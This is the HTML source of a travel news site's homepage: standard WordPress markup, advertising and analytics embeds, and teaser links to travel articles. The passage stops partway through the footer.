<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" type="image/png"
	      href="http://www.travelfuntu.com/wp-content/themes/tf/favicon.png"/>


	<title>TravelFuntu | Go travel Now</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Travelfuntu is here to satisfy your wanderlust. Visit daily to get all the latest travel info, insider tips and vacation inspiration."/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://www.travelfuntu.com/" />
<link rel="next" href="http://www.travelfuntu.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="TravelFuntu | Go travel Now" />
<meta property="og:description" content="Travelfuntu is here to satisfy your wanderlust. Visit daily to get all the latest travel info, insider tips and vacation inspiration." />
<meta property="og:url" content="http://www.travelfuntu.com/" />
<meta property="og:site_name" content="TravelFuntu" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="Travelfuntu is here to satisfy your wanderlust. Visit daily to get all the latest travel info, insider tips and vacation inspiration." />
<meta name="twitter:title" content="TravelFuntu | Go travel Now" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/www.travelfuntu.com\/","name":"TravelFuntu","potentialAction":{"@type":"SearchAction","target":"http:\/\/www.travelfuntu.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="TravelFuntu &raquo; Feed" href="http://www.travelfuntu.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="TravelFuntu &raquo; Comments Feed" href="http://www.travelfuntu.com/comments/feed/" />
<link rel='stylesheet' id='greeningz-style-main-css'  href='http://www.travelfuntu.com/wp-content/themes/tf/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='greeningz-style-css'  href='http://www.travelfuntu.com/wp-content/themes/tf/style.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://www.travelfuntu.com/wp-content/themes/tf/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://www.travelfuntu.com/wp-content/themes/tf/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://www.travelfuntu.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.travelfuntu.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.travelfuntu.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-89147165-2', 'auto');
  ga('send', 'pageview');

</script>

<script type="text/javascript">
  var taboola_account = 'travelfuntu';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'mt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'mf';
    }
    else {
      taboola_account += 'mr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'dt';
    }
    else {
      taboola_account += 'dr';
    }
  }
  else if (taboola_platform == 'tablet') {
      taboola_account += 't';
  }
  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.9";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag --><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.9;}}};</script>
   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/TF/prebid.js" async></script>


  <script>
    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

    
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: 'a9f35723-4b6d-49e7-a931-f8fce6c4e9ca', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/202308823/tf-desktop-low', sizes: [[728, 90]], slotID: 'ad_pos_tf-desktop-low'},
                        {slotName: '/202308823/tf-desktop-top', sizes: [[728, 90]], slotID: 'ad_pos_tf-desktop-top'},
                        {slotName: '/202308823/tf-rr-atf', sizes: [[300, 250]], slotID: 'ad_pos_tf-rr-atf'},
                        {slotName: '/202308823/tf-rr-btf', sizes: [[300, 250]], slotID: 'ad_pos_tf-rr-btf'},
                        {slotName: '/202308823/tf-rr-mid', sizes: [[300, 600], [300, 250]], slotID: 'ad_pos_tf-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        
    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

    pbjs.que.push(function() {
        pbjs.enableAnalytics({
            provider: 'cmv2'
        });
    });

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
		            googletag.defineSlot('/202308823/tf-desktop-low', [728, 90], 'ad_pos_tf-desktop-low').addService(googletag.pubads());
            googletag.defineSlot('/202308823/tf-desktop-top', [728, 90], 'ad_pos_tf-desktop-top').addService(googletag.pubads());
            googletag.defineOutOfPageSlot('/202308823/tf-edge', 'ad_pos_tf-edge').addService(googletag.pubads());
            googletag.defineSlot('/202308823/tf-rr-atf', [300, 250], 'ad_pos_tf-rr-atf').addService(googletag.pubads());
            googletag.defineSlot('/202308823/tf-rr-btf', [300, 250], 'ad_pos_tf-rr-btf').addService(googletag.pubads());
            googletag.defineSlot('/202308823/tf-rr-mid', [[300, 600], [300, 250]], 'ad_pos_tf-rr-mid').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>

</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>

<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->
<header id="top_header">

<div id="second_top_nav" class="hidden-xs">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="top-logo">
					<a class="top-logo-link"" href="http://www.travelfuntu.com">
											<img
							src="http://www.travelfuntu.com/wp-content/themes/tf/images/logo.png"
							alt="TravelFuntu"
							class="logo-image img-responsive">
										</a>
				</div>
				                        <div id="text-5" class="widget_text ads-728x90 hidden-sm">			<div class="textwidget"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- TF - HomePage -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2428728305118953"
     data-ad-slot="8359724429"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>
		</div>
                                    			</div>
		</div>
	</div>
</div>
<nav class="navbar navbar-default" id="top_nav">

	<div class="container-fluid">
		<div id="social_top">
	<a href="https://www.facebook.com/TravelFuntu/" class="social_top" target="_blank"><img src="http://www.travelfuntu.com/wp-content/themes/tf/images/fb_icon.png" alt="facebook" class="social_icon"></a>
	<a href="https://twitter.com/travel_funtu" class="social_top" target="_blank"><img src="http://www.travelfuntu.com/wp-content/themes/tf/images/tw_icon.png" alt="twitter" class="social_icon"></a>
</div>
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed"
			        data-toggle="collapse" data-target="#navbar"
			        aria-expanded="false" aria-controls="navbar">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand visible-xs-inline-block"
			   href="http://www.travelfuntu.com">
									<img
						src="http://www.travelfuntu.com/wp-content/themes/tf/images/logo.png"
						alt="TravelFuntu"
						class="logo-image img-responsive">
							</a>
		</div>
		<div id="navbar" class="navbar-collapse collapse"><ul id="menu-header-menu" class="nav navbar-nav"><li id="menu-item-231" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-231"><a title="Insider Info" href="http://www.travelfuntu.com/category/insider-info/">Insider Info</a></li>
<li id="menu-item-232" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-232"><a title="Adventure" href="http://www.travelfuntu.com/category/adventure/">Adventure</a></li>
<li id="menu-item-233" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-233"><a title="Culture" href="http://www.travelfuntu.com/category/culture/">Culture</a></li>
<li id="menu-item-234" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-234"><a title="Top Attractions" href="http://www.travelfuntu.com/category/top-attractions/">Top Attractions</a></li>
<li id="menu-item-320" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-320"><a title="Accommodations" href="http://www.travelfuntu.com/category/accommodations/">Accommodations</a></li>
<li id="menu-item-321" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-321"><a title="Local Flavor" href="http://www.travelfuntu.com/category/local-flavor/">Local Flavor</a></li>
<li id="menu-item-322" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-322"><a title="Spotlight" href="http://www.travelfuntu.com/category/spotlight/">Spotlight</a></li>
</ul></div>		<!--/.navbar-collapse -->

		<a href="http://www.travelfuntu.com" class="logo_min_link"><img
				src="http://www.travelfuntu.com/wp-content/themes/tf/images/logo_min.png"
				alt="TravelFuntu" class="logo_min"></a>
	</div>
</nav>

</header>
<main id="main_content">
	
<div id="banner">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<div class="top_block_big">
																										<article>
								<a href="http://www.travelfuntu.com/spotlight/destination-spotlight-costa-rica/" class="wrapp_item">
									<div class="img_article" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/19191344/Costa-Rica-Beach-1200x600.jpg')"></div>
									<div class="item_text">
										<h2 class="header_item">Destination Spotlight:  Costa Rica</h2>
                                        <div class="upper_banner_space">&nbsp;</div>
										<div class="read_more">Read More <span class="icon icon-read_more"></span></div>
                                        <div class="lower_banner_space">&nbsp;</div>
                                        <p class="meta_post"><span class="meta_post_author">Steve Becker</span> &bull; <span class="meta_post_date">Mar 22, 2018</span></p>
                                    </div>
								</a>
							</article>
											</div><!--top_block_big-->
			</div>
		</div>
	</div>
</div>
	
<div id="three_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<h2 class="head-main-2 tb_head">Must Read</h2>
				<div class="row">
					

<div class="col-xs-12 col-sm-4 tb_one">
										<div class="main_block_item">
				<a href="http://www.travelfuntu.com/insider-info/southwest-airlines-raises-drink-prices/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/19155136/Southwest-Airlines-390x222.jpg')"></div>
					</div>

					<h2 class="mb_head">Southwest Airlines Raises Drink Prices</h2>
					<p class="meta_post"><span class="meta_post_author">John Poe</span> &bull; <span class="meta_post_date">Mar 20, 2018</span></p>
					<p class="mb_text">





Southwest Airlines has long been a favorite for frequent fliers due to the affordable rates it’s become famous for. Passengers can enjoy...</p>
					<p class="mb_read_more">Read more</p>
				</a>
			</div>
			
</div>

					

<div class="col-xs-12 col-sm-8 tb_two">
	<div class="row">
		
<div class="col-xs-12 col-sm-6 tb_item tb_item_center">
										<div class="main_block_item">
				<a href="http://www.travelfuntu.com/adventure/americas-popular-national-park-made-cruising/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/17195509/Blue-Ridge-Parkway-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">America’s Most Popular National Park Is Made For Cruising</h2>
						<p class="meta_post"><span class="meta_post_author">Steve Becker</span> <span>&bull;</span> <span class="meta_post_date">March 18, 2018</span></p>
						<p class="mb_text">





There are 59 National Parks in the United States. That’s a lot of opportunities for people to get outside and get in touch with the great...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
												<div class="main_block_item">
				<a href="http://www.travelfuntu.com/vacation-inspiration/dubai-hotel-social-media-junkys-dream/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/12194836/Atlantis-the-Palm-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">This Dubai Hotel Is A Social Media Junky’s Dream</h2>
						<p class="meta_post"><span class="meta_post_author">John Poe</span> <span>&bull;</span> <span class="meta_post_date">March 16, 2018</span></p>
						<p class="mb_text">





Atlantis, The Palm, is no stranger to social media. In fact, the Dubai resort has over one million followers on Facebook. To celebrate...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
												<div class="main_block_item">
				<a href="http://www.travelfuntu.com/adventure/5-vacation-destination-recommendations-2018/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/09174356/Grenada-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">5 More Vacation Destination Recommendations For 2018</h2>
						<p class="meta_post"><span class="meta_post_author">Steve Becker</span> <span>&bull;</span> <span class="meta_post_date">March 14, 2018</span></p>
						<p class="mb_text">



We’ve already provided a number of vacation destination recommendations to add to your bucket list, but when it comes to traveling, you can’t...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
			
</div>
		
<div class="col-xs-12 col-sm-6 tb_item tb_item_right">
										<div class="main_block_item">
				<a href="http://www.travelfuntu.com/accommodations/now-can-stay-shipwreck-namibia/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/07201756/Shipwreck-Lodge-1-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">Now You Can Stay In A Shipwreck In Namibia</h2>
						<p class="meta_post"><span class="meta_post_author">John Poe</span> <span>&bull;</span> <span class="meta_post_date">March 12, 2018</span></p>
						<p class="mb_text">





Namibia’s Skeleton Coast is littered with the rusted remains of wrecked ships and the skeletons of whales. Locals in the area refer to...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
												<div class="main_block_item">
				<a href="http://www.travelfuntu.com/insider-info/best-smartphones-travel-photography/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/03/07153850/Google-Pixel-2-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">Best Smartphones For Travel Photography</h2>
						<p class="meta_post"><span class="meta_post_author">John Poe</span> <span>&bull;</span> <span class="meta_post_date">March 10, 2018</span></p>
						<p class="mb_text">



Unless travel photography is your primary career, you really don’t need to pack that $5K Nikon or Canon for your next vacation. Today’s...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
												<div class="main_block_item">
				<a href="http://www.travelfuntu.com/spotlight/best-mexican-beach-town-youve-never-heard/">
					<div class="mb_img_wrap">
						<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/28212822/Puerto-Escondido-390x222.jpg')"></div>
					</div>
					<div class="mb_content_wrap">
						<h2 class="mb_head">The Best Mexican Beach Town You’ve Never Heard Of</h2>
						<p class="meta_post"><span class="meta_post_author">John Poe</span> <span>&bull;</span> <span class="meta_post_date">March 8, 2018</span></p>
						<p class="mb_text">





Hotel Escondido is located just outside of Puerto Escondido, a little-known beach town in Mexico. It just so happens that the hotel sits...</p>
						<p class="mb_read_more">Read more</p>
					</div>
				</a>
			</div>
			
</div>
		<div class="col-xs-12">
		<div id="text-5" class="widget_text ads-728x90 hidden-sm">			<div class="textwidget"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- TF - HomePage -->
<ins class="adsbygoogle"
     style="display:inline-block;width:728px;height:90px"
     data-ad-client="ca-pub-2428728305118953"
     data-ad-slot="8359724429"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>
		</div>
	
</div>
	</div>
</div>
				</div>
			</div>
		</div>
	</div>
</div>
	<div id="main_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<h2 class="head-main-2">popular News</h2>
				<div class="main_block_item_wrap clearfix">
																										<div class="main_block_item">
								<a href="http://www.travelfuntu.com/culture/fun-ways-convey-greeting-different-parts-world/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/27171904/Air-Kissing-390x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Fun Ways To Convey A Greeting In Different Parts Of The World</h2>
									<p class="mb_text">



For many of us, greeting someone—be it a friend or a stranger—is usually as simple as waving, with an occasional handshake or hug thrown in....</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																												<div class="main_block_item">
								<a href="http://www.travelfuntu.com/vacation-inspiration/cold-travel-destinations-popular-right-now/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/26191407/Lapland-Finland-390x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Why Cold Travel Destinations Are So Popular Right Now</h2>
									<p class="mb_text">





For many travel enthusiasts, winter is a time to hold up indoors, parked in front of a warm fire and dreaming about warmer weather and...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
																												<div class="main_block_item">
								<a href="http://www.travelfuntu.com/local-flavor/travel-spotlight-chile/">
									<div class="mb_img_wrap">
										<div class="mb_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/22124142/Chile-390x222.jpg')"></div>
									</div>

									<h2 class="mb_head">Travel Spotlight:  Chile</h2>
									<p class="mb_text">





Chile serves as the Western border of South America, extending nearly 2,600 miles and offering up a multitude of climates from deserts to...</p>
									<p class="mb_read_more">Read more</p>
								</a>
							</div>
							<!--						<script id="true_loadmore">-->
<!--							var ajaxurl = '--><!--/wp-admin/admin-ajax.php';-->
<!--							var true_posts = '--><!--';-->
<!--							var current_page = --><!--;-->
					<!--						</script>
<!--					-->
				</div>
			</div>
		</div>
	</div>
</div>
	<div id="wide_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12 col-sm-8 wb_wide_wrap">
	<h2 class="head-main-2">shocking</h2>
						<div class="wb_wide">
			<a href="http://www.travelfuntu.com/culture/5-adventures-plan-next-vacation-around/">
				<div class="wb_wide_img_wrap">
					<div class="wb_wide_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/21212642/Stand-up-Paddle-Boarding-in-Ljubljana-770x305.jpg')"></div>
				</div>
				<div class="wb_wide_content">
					<h2 class="wb_wide_head">5 Adventures You Should Plan Your Next Vacation Around</h2>
					<p class="read_more">read more</p>
				</div>
			</a>
		</div>
		</div>
			<div class="col-xs-12 col-sm-4 wb_right_wrap">
	<h2 class="head-main-2">Trending</h2>
						<div class="wb_right">
			<a href="http://www.travelfuntu.com/culture/airbnb-now-offering-lodging-board-blue-planet-research-vessel/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/16210847/Airbnb-Blue-Planet-Vessel-215x104.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Airbnb Now Offering Lodging On Board The Blue Planet Research Vessel</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://www.travelfuntu.com/insider-info/self-check-kiosks-officially-dirtiest-locations-airports/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/19184647/Self-Service-Airport-Kiosks-215x104.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Self-Check-In Kiosks Are Officially The Dirtiest Locations In Airports</h2></a>
		</div>
								<div class="wb_right">
			<a href="http://www.travelfuntu.com/spotlight/virgin-atlantic-now-offers-love-suites-travelers-prefer-cuddle-trip/">
				<div class="wb_right_img_wrap">
					<div class="wb_right_img" style="background-image: url('http://d25fyzf9e0hiy5.cloudfront.net/wp-content/uploads/2018/02/19165758/New-Virgin-Atlantic-Planes-215x104.jpg')"></div>
				</div>
				<h2 class="wb_right_text">Virgin Atlantic Now Offers ‘Love Suites” For Travelers Who Prefer To Cuddle During Their Trip</h2></a>
		</div>
		</div>
		</div>
	</div>
</div>
</main>



<footer id="main_footer">
	<div class="container">
		<div class="row">
			
<div class="col-xs-12 col-sm-4 footer_left equal_footer">
	<a class="footer_logo_link" href="http://www.travelfuntu.com">
		<img src="http://www.travelfuntu.com/wp-content/themes/tf/images/footer-logo.png" alt="TravelFuntu" class="footer_logo_image img-responsive">
	</a>

	<div class="about_us widget">
		<h2 class="about_us_head widget-title"></h2>
		<p class="about_us_text"> Travelfuntu is here to satisfy your wanderlust. Visit daily to get all the latest travel info, insider tips and vacation inspiration.</p>
	</div>

	<div class="hidden-xs">
		
<div class="footer_social widget">
	<h2 class="footer_social_head widget-title hidden-xs">FOLLOW US</h2>
	<a href="https://www.facebook.com/TravelFuntu/" target="_blank" class="icon icon-fb"></a>
	<a href="https://twitter.com/travel_funtu" target="_blank" class="icon icon-tw"></a>
</div>
	</div>


</div>
			<div class="col-xs-12 col-sm-4 footer_center equal_footer">
			<div class="widget">
			<h2 class="popular_post_head widget-title">Even more stories</h2>
			<ul>
													<li>
					<div class="popular_post_item">
						<a href="http://www.travelfuntu.com/accommodations/hotel-amenities-likely-thankfully-gone-good/" class="popular_post_item_link">
							<p class="popular_post_item_head">Hotel Amenities That Are Likely (And Thankfully) Gone For Good</p>
							<p class="popular_post_item_meta widget_meta">
								Feb 20, 2018							</p>
						</a>
					</div>
				</li>
													<li>
					<div class="popular_post_item">
						<a href="http://www.travelfuntu.com/insider-info/5-must-items-working-traveling/" class="popular_post_item_link">
							<p class="popular_post_item_head">5 Must-Have Items For Working Out While Traveling</p>
							<p class="popular_post_item_meta widget_meta">
								Feb 17, 2018							</p>
						</a>
					</div>
				</li>
													<li>
					<div class="popular_post_item">
						<a href="http://www.travelfuntu.com/insider-info/common-occurrences-flights-mean/" class="popular_post_item_link">
							<p class="popular_post_item_head">Common Occurrences On Flights And What They Mean</p>
							<p class="popular_post_item_meta widget_meta">
								Feb 15, 2018							</p>
						</a>
					</div>
				</li>
													<li>
					<div class="popular_post_item">
